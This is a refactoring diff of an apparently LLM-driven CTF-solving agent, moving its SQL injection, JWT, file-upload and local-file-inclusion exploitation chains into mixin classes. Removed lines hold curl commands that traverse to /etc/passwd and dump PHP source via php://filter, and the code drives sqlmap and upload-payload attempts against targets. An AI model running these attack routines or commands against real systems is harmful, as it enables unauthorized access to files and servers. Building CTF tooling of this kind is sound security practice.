@@ -44,7 +44,12 @@ from ...harness.audit_events import (
 from ...harness.checkpoint_store import CheckpointStore
 from ...harness.session_ledger import SessionLedger
 from .chains.base import _ChainOutcome
+from .chains.file_read import LFIChainMixin
 from .chains.injection import GenericInjectionChainMixin
+from .chains.jwt import JWTChainMixin
+from .chains.misc import MiscChainMixin
+from .chains.sqli import SQLIChainMixin
+from .chains.upload import UploadChainMixin
 from .coordinator import CTFCoordinator
 from .capability_registry import CapabilityRegistry
 from .ctf_state import CTFState, FlagProof, LLMStepLog
@@ -266,7 +271,14 @@ class SolveResult:
     reason: str = ""
 
 
-class CTFTaskDispatcher(GenericInjectionChainMixin):
+class CTFTaskDispatcher(
+    GenericInjectionChainMixin,
+    LFIChainMixin,
+    MiscChainMixin,
+    JWTChainMixin,
+    UploadChainMixin,
+    SQLIChainMixin,
+):
     def __init__(
         self,
         runtime,
@@ -463,7 +475,7 @@ class CTFTaskDispatcher(GenericInjectionChainMixin):
                 self._active_hypothesis_context = None
                 self._active_strategy_context = None
                 missing_names = sorted(exc.missing)
-                if os.getenv("PENTESTAGENT_AUTO_INSTALL", "false").lower() == "true":
+                if os.getenv("FLAGHUNTER_AUTO_INSTALL", "false").lower() == "true":
                     for name in missing_names:
                         ok = await self.tool_guard.install_and_verify(name)
                         self._emit(f"[CTF dispatcher] auto-install {name}: {'ok' if ok else 'failed'}")
@@ -2328,15 +2340,8 @@ class CTFTaskDispatcher(GenericInjectionChainMixin):
             "web": lambda: self._execute_web_route(target, page_features, hint),
             "misc": lambda: self._execute_misc_chain(target, page_features, hint),
             "sqli": lambda: self._execute_sqli_chain(target, page_features, hint),
-            "jwt": lambda: self._run_jwt_manipulation_strategy(target, page_features),
-            "lfi": lambda: self._execute_terminal_commands(
-                target,
-                [
-                    f'curl -s "{target}?file=../../../etc/passwd"',
-                    f'curl -s "{target}?file=../../../flag.txt"',
-                    f'curl -s "{target}?file=php://filter/convert.base64-encode/resource=index.php"',
-                ],
-            ),
+            "jwt": lambda: self._execute_jwt_chain(target, page_features),
+            "lfi": lambda: self._execute_lfi_chain(target),
             "cmdi": lambda: self._attempt_generic_param_cmdi(target, page_features),
             "ssrf": lambda: self._attempt_generic_param_ssrf(target, page_features),
             "upload": lambda: self._execute_upload_chain(target, page_features, hint),
@@ -2389,137 +2394,6 @@ class CTFTaskDispatcher(GenericInjectionChainMixin):
         if outcome.progress or outcome.flag:
             return outcome
         return await self._execute_web_chain(target, page_features, hint)
-
-    async def _execute_misc_chain(
-        self,
-        target: str,
-        page_features: dict[str, Any],
-        hint: str,
-    ) -> _ChainOutcome:
-        reasons: list[str] = []
-        progress = False
-
-        for strategy in self._strategies_for_chain("misc", target=target, page_features=page_features, hint=hint):
-            if strategy.kind == "llm_driven_exploration":
-                continue
-            outcome = await self.strategy_registry.execute(strategy.kind, self._strategy_context(
-                target=target,
-                page_features=page_features,
-                hint=hint,
-            ))
-            progress = progress or outcome.progress
-            if outcome.flag:
-                return outcome
-            if outcome.reason:
-                reasons.append(outcome.reason)
-
-        if (
-            self.llm is not None
-            and self.state is not None
-            and self.state.is_llm_exploration_allowed()
-        ):
-            fallback = await self._run_llm_driven_exploration(
-                self._strategy_context(
-                    target=target,
-                    page_features=page_features,
-                    hint=hint,
-                    extras={"chain_name": "misc"},
-                )
-            )
-            progress = progress or fallback.progress
-            if fallback.flag:
-                return fallback
-            if fallback.reason:
-                reasons.append(fallback.reason)
-
-        return _ChainOutcome(progress=progress, reason="; ".join(filter(None, reasons)))
-
-    async def _execute_sqli_chain(
-        self,
-        target: str,
-        page_features: dict[str, Any],
-        hint: str,
-    ) -> _ChainOutcome:
-        reasons: list[str] = []
-        progress = False
-        sqli_strategies = list(
-            self._strategies_for_chain(
-                "sqli",
-                target=target,
-                page_features=page_features,
-                hint=hint,
-            )
-        )
-
-        for strategy in sqli_strategies:
-            if strategy.kind == "generic_param_sqli":
-                continue
-            bypass = await self.strategy_registry.execute(
-                strategy.kind,
-                self._strategy_context(
-                    target=target,
-                    page_features=page_features,
-                    hint=hint,
-                ),
-            )
-            progress = progress or bypass.progress
-            if bypass.flag:
-                return bypass
-            if bypass.reason:
-                reasons.append(bypass.reason)
-
-        forms = page_features.get("forms") or []
-        auth_form = find_auth_form(forms)
-        sqlmap_form = auth_form
-        if sqlmap_form is None:
-            for form in forms:
-                if not isinstance(form, dict):
-                    continue
-                inputs = form.get("inputs") or []
-                if any(
-                    isinstance(item, dict) and str(item.get("name") or "").strip()
-                    for item in inputs
-                ):
-                    sqlmap_form = form
-                    break
-        sqli_impl = self.capability_registry.best_available("sql_injection_test")
-        if sqli_impl is None:
-            missing = self.capability_registry.missing_tools_for("sql_injection_test")
-            if missing:
-                raise ToolMissingError(missing)
-        elif sqli_impl.method == "sqlmap":
-            sqlmap = await self._attempt_sqlmap_sqli(target, auth_form=sqlmap_form)
-            progress = progress or sqlmap.progress
-            if sqlmap.flag:
-                return sqlmap
-            if sqlmap.reason:
-                reasons.append(sqlmap.reason)
-        else:
-            reasons.append(
-                f"sqli capability degraded to {sqli_impl.method}; skip heavy installer flow"
-            )
-
-        for strategy in sqli_strategies:
-            if strategy.kind != "generic_param_sqli":
-                continue
-            generic = await self.strategy_registry.execute(
-                strategy.kind,
-                self._strategy_context(
-                    target=target,
-                    page_features=page_features,
-                    hint=hint,
-                ),
-            )
-            progress = progress or generic.progress
-            if generic.flag:
-                return generic
-            if generic.reason:
-                reasons.append(generic.reason)
-
-        if hint:
-            reasons.append(f"hint considered: {hint}")
-
-        return _ChainOutcome(progress=progress, reason="; ".join(filter(None, reasons)))
 
     async def _run_jwt_manipulation_strategy(
         self,
@@ -7892,126 +7766,6 @@ print(json.dumps(result, ensure_ascii=False))
         )
         return response, action_url
 
-    async def _execute_upload_chain(
-        self,
-        target: str,
-        page_features: dict[str, Any],
-        hint: str,
-    ) -> _ChainOutcome:
-        self.tool_guard.require(["http_request"])
-        base = _base_target(target)
-        forms = list(page_features.get("forms") or [])
-        if not forms:
-            resp = await self._runtime_proxy_action(
-                "get",
-                url=target,
-                timeout=12,
-                audit_target=target,
-                audit_metadata={"phase": "upload_chain", "stage": "fetch_forms"},
-            )
-            if isinstance(resp, dict) and not resp.get("error"):
-                body = str(resp.get("body") or "")
-                final_url = str(resp.get("final_url") or target)
-                forms = _parse_forms_from_html(body, final_url)
-                await self._scan_and_store(body, final_url, evidence_source="http-response", page_features=page_features)
-
-        upload_forms = [
-            form for form in forms
-            if any(
-                isinstance(item, dict)
-                and str(item.get("type") or "").strip().lower() == "file"
-                and str(item.get("name") or "").strip()
-                for item in (form.get("inputs") or [])
-            )
-        ]
-        if not upload_forms:
-            return _ChainOutcome(progress=False, reason="upload chain: no file input form discovered")
-
-        progress = False
-        reasons: list[str] = []
-        for form in upload_forms[:2]:
-            action_url = self._form_action_url(target, form)
-            data_fields = self._default_upload_form_fields(form)
-            file_fields = [
-                str(item.get("name") or "").strip()
-                for item in (form.get("inputs") or [])
-                if isinstance(item, dict)
-                and str(item.get("type") or "").strip().lower() == "file"
-                and str(item.get("name") or "").strip()
-            ]
-            if not file_fields:
-                continue
-
-            for payload in self._generic_upload_payloads():
-                files = {
-                    field_name: {
-                        "filename": payload["filename"],
-                        "content": payload["content"],
-                        "content_type": payload["content_type"],
-                    }
-                    for field_name in file_fields[:1]
-                }
-                response = await self._runtime_proxy_action(
-                    "request",
-                    method=str(form.get("method") or "POST").upper(),
-                    url=action_url,
-                    data=data_fields,
-                    files=files,
-                    timeout=20,
-                    audit_target=action_url,
-                    audit_metadata={
-                        "phase": "upload_chain",
-                        "filename": payload["filename"],
-                        "fields": sorted(file_fields[:1]),
-                    },
-                )
-                if not isinstance(response, dict) or response.get("error"):
-                    continue
-                body = str(response.get("body") or "")
-                final_url = str(response.get("final_url") or action_url)
-                status = int(response.get("status_code") or 0)
-                progress = progress or status > 0
-                await self._scan_and_store(body, final_url, evidence_source="http-response", page_features=page_features)
-                if self.state is not None:
-                    self.state.add_observation(
-                        "upload_attempt",
-                        payload["filename"],
-                        source="upload_chain",
-                        metadata={
-                            "strategy_kind": "upload_chain",
-                            "status_code": status,
-                            "action_url": action_url,
-                            "final_url": final_url,
-                        },
-                    )
-
-                if flag := self._extract_flag(body):
-                    verification = await self._observe_flag(
-                        flag,
-                        final_url,
-                        evidence_source="http-response",
-                        rationale=f"upload response: {payload['filename']}",
-                    )
-                    if verification.decision in {"verified", "runtime"}:
-                        return _ChainOutcome(progress=True, flag=verification.flag, reason="upload response flag")
-
-                follow_urls = self._upload_followup_urls(
-                    base=base,
-                    response_body=body,
-                    response_url=final_url,
-                    filename=str(payload["filename"]),
-                )
-                follow = await self._follow_uploaded_payloads(follow_urls, payload["filename"], page_features)
-                progress = progress or follow.progress
-                if follow.flag:
-                    return follow
-                if follow.reason:
-                    reasons.append(follow.reason)
-
-        if progress:
-            return _ChainOutcome(progress=True, reason="upload attempts exhausted; " + "; ".join(reasons[:3]))
-        return _ChainOutcome(progress=False, reason="upload chain made no successful request")
-
     def _form_action_url(self, target: str, form: dict[str, Any]) -> str:
         action = str(form.get("action") or "").strip() or target
         return urljoin(target, action)
@@ -9566,6 +9320,11 @@ print(json.dumps(result, ensure_ascii=False))
             page_features=page_features,
             hint=hint,
             extras=resolved_extras,
+            state=self.state,
+            runtime=self.runtime,
+            capability_registry=self.capability_registry,
+            strategy_memory=self.strategy_memory,
+            exploitation_mode=self.exploitation_mode,
         )
 
     def _strategies_for_chain(
